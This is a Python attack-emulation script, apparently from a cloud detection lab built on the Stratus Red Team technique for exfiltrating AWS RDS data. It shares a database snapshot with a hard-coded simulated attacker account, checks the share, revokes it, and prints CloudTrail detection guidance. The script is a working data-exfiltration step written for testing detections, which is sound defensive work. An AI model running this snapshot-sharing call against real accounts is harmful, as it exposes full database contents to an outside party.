"""
Technique : aws.exfiltration.rds-share-snapshot
Tactic    : Exfiltration (T1537)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.exfiltration.rds-share-snapshot/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the RDS instance + snapshot.
  - Note: RDS provisioning and snapshotting typically takes 5-15 minutes.

How the attack works:
  An attacker with rds:ModifyDBSnapshotAttribute shares an RDS snapshot with an
  external AWS account using the "restore" attribute. The attacker can then restore
  the snapshot in their own account, gaining full access to all database contents.
  This is one of the most impactful data exfiltration techniques for RDS databases.

Detection signal:
  - rds:ModifyDBSnapshotAttribute in CloudTrail with valuesToAdd containing an
    external (non-organization) AWS account ID.

Revert:
  - Automated: ModifyDBSnapshotAttribute with valuesToRemove to revoke access.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import os
import subprocess
import time
from pathlib import Path

import boto3
from botocore.exceptions import ClientError


# ── Constants ─────────────────────────────────────────────────────────────────

# Simulated attacker-controlled AWS account ID (from Stratus Red Team)
ATTACKER_ACCOUNT_ID = "193672423079"
DWELL_TIME_S        = 2


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir, capture_output=True, text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}\n  {msg}\n{'=' * 60}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    stack_dir   = str(Path(__file__).parent.parent / "infra")
    infra       = get_pulumi_outputs(stack_dir)
    snapshot_id = infra.get("snapshot_id", "")

    if not snapshot_id:
        print("[!] snapshot_id not found. Did you run `pulumi up`?")
        return

    session    = boto3.Session()
    rds_client = session.client("rds")

    try:
        # ── Step 1: Share snapshot with attacker account ──────────────────────
        banner("Step 1 — Share RDS snapshot with external account (ModifyDBSnapshotAttribute)")
        rds_client.modify_db_snapshot_attribute(
            DBSnapshotIdentifier=snapshot_id,
            AttributeName="restore",
            ValuesToAdd=[ATTACKER_ACCOUNT_ID],
        )
        print(f"  [+] Snapshot {snapshot_id} shared with account: {ATTACKER_ACCOUNT_ID}")
        print(f"  [!] CloudTrail event: rds:ModifyDBSnapshotAttribute")
        print(f"  [!] Attacker can now restore the database snapshot in their account.")

        # ── Step 2: Verify the share ──────────────────────────────────────────
        banner("Step 2 — Verify snapshot attribute was set")
        attrs = rds_client.describe_db_snapshot_attributes(
            DBSnapshotIdentifier=snapshot_id,
        )
        for attr in attrs["DBSnapshotAttributesResult"]["DBSnapshotAttributes"]:
            if attr["AttributeName"] == "restore":
                values = attr.get("AttributeValues", [])
                print(f"  [+] restore permissions: {values}")

        time.sleep(DWELL_TIME_S)

    finally:
        # ── Revert: Remove attacker account from snapshot permissions ─────────
        banner("Revert — Revoke restore permission (ModifyDBSnapshotAttribute)")
        if snapshot_id:
            try:
                rds_client.modify_db_snapshot_attribute(
                    DBSnapshotIdentifier=snapshot_id,
                    AttributeName="restore",
                    ValuesToRemove=[ATTACKER_ACCOUNT_ID],
                )
                print(f"  [+] Restore permission revoked for account: {ATTACKER_ACCOUNT_ID}")
                print(f"  [!] CloudTrail event: rds:ModifyDBSnapshotAttribute")
            except ClientError as exc:
                print(f"  [!] ModifyDBSnapshotAttribute (remove) failed: {exc}")

    banner("Complete")
    print("CloudTrail events: rds:ModifyDBSnapshotAttribute x2, rds:DescribeDBSnapshotAttributes")
    print("\nDetection guidance:")
    print("  Alert on rds:ModifyDBSnapshotAttribute adding restore for any external account.")
    print("  Snapshot sharing is rarely needed outside DR scenarios with known partners.")
    print("\nRun `pulumi destroy` in ../infra/ to remove the RDS instance and snapshot.")


if __name__ == "__main__":
    main()
